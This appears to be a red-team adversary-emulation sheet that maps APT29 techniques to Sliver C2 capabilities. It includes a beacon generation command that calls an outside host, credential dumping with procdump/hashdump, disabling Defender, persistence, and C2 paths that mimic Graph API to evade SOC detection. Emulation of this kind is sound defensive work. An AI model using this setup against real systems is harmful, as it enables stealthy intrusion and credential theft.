# APT29 (Cozy Bear) — MITRE ATT&CK Mapping

## Threat Actor Overview
APT29 is a Russian state-sponsored group attributed to the SVR (Foreign Intelligence
Service). Known for patient, long-term intrusions with heavy emphasis on stealth,
encrypted communications, and anti-forensics.

## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique | Sliver Capability |
|---|---|---|---|
| Initial Access | T1566.001 | Spearphishing Attachment | Manual delivery of beacon binary |
| Execution | T1059.001 | PowerShell | `shell powershell -ep bypass` |
| Execution | T1204.002 | Malicious File | Beacon executed by user |
| Persistence | T1053.005 | Scheduled Task | `shell schtasks /create` |
| Defense Evasion | T1070.004 | File Deletion | `rm` + post-op wipe script |
| Defense Evasion | T1027 | Obfuscated Files | Sliver binary obfuscation |
| Defense Evasion | T1562.001 | Disable Security Tools | Defender disabled pre-execution |
| Credential Access | T1003.001 | LSASS Memory | `procdump` / `hashdump` |
| Discovery | T1082 | System Information | `sysinfo` |
| Discovery | T1057 | Process Discovery | `ps` |
| Discovery | T1083 | File & Directory Discovery | `ls` |
| Lateral Movement | T1021.001 | Remote Desktop Protocol | `portfwd` |
| Collection | T1113 | Screen Capture | `screenshot` |
| Collection | T1005 | Data from Local System | `download` |
| Command & Control | T1071.001 | Web Protocols (HTTPS) | HTTPS beacon via Nginx redirector |
| Command & Control | T1573.002 | Asymmetric Cryptography | TLS with custom CA |
| Command & Control | T1008 | Fallback Channels | Multiple beacon paths (/v1.0/me etc.) |
| Exfiltration | T1041 | Exfil Over C2 Channel | `download` via beacon |

## APT29 Implant Configuration

| Setting | Value | APT29 Rationale |
|---|---|---|
| Protocol | HTTPS | APT29 exclusively uses encrypted channels; never plaintext |
| Interval | 300 seconds (5 min) | APT29 is known for patience — infrequent callbacks evade beaconing detection |
| Jitter | 50% | Heavy randomization (150-450s) breaks timing-based detection signatures |
| Kill date | +72 hours | APT29 uses time-limited implants to limit exposure if captured |
| Paths | /v1.0/me, /v1.0/me/messages | Mimics Microsoft Graph API — blends with O365 traffic |
| User-Agent | Chrome/Windows | Matches target environment profile |

## Sliver Implant Generation Command

\`\`\`
sliver > generate beacon \
    --http my-website.com \
    --os windows \
    --arch amd64 \
    --seconds 300 \
    --jitter 50 \
    --kill-date <+72h timestamp> \
    --save /tmp/apt29-beacon.exe
\`\`\`

## Why These Settings Match APT29 Tradecraft

**Long interval (5 min):** APT29 operations like SolarWinds used intervals of
hours, not seconds. Frequent callbacks are the #1 detection vector for C2 traffic.

**High jitter (50%):** A beacon that calls back every exactly 300s is trivially
detected. With 50% jitter the interval varies between 150-450s — no regularity
for a SIEM to correlate.

**Kill date:** APT29 implants found in the wild self-destruct after a window.
This limits forensic value if captured post-operation and prevents implants
from persisting into future unrelated investigations.

**HTTPS + Graph API paths:** APT29 consistently uses legitimate cloud service
traffic patterns (Office 365, Azure AD) as cover. A SOC analyst sees
Authorization: Bearer headers and /v1.0/me paths and assumes it's O365.
